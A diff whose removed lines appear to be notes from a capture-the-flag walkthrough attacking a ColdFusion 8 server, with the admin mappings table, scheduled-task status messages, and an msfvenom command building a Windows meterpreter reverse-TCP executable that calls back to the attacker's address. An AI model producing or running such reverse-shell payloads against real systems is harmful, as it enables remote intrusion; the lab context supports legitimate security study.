@@ -1,31 +1,4 @@
-Active ColdFusion Mappings
-Actions 	Logical Path 	Directory Path
-  	/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
-Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc  
 
-hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4545 -f exe -o meterpreter.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: meterpreter.exe
-
-
- There was an error running your scheduled task. Reasons for which scheduled tasks might fail include:
-
-    The scheduled task is paused
-    The URL is a redirection URL.
-    The URL is protected by IIS NT Challenge/Response or Apache .htaccess password. The Username and Password text fields for editing a scheduled task are intended to support Basic Authentication only.
-    The Domain Name lookup failed. Try using the IP address of the domain whenever possible.
-    The URL is an SSL site, but the SSL port was specified incorrectly.
-    The Web site is not responding.
-    The directory specified for published results does not exist.
-
-
-======
-
-This scheduled task was completed successfully.
 
 
 
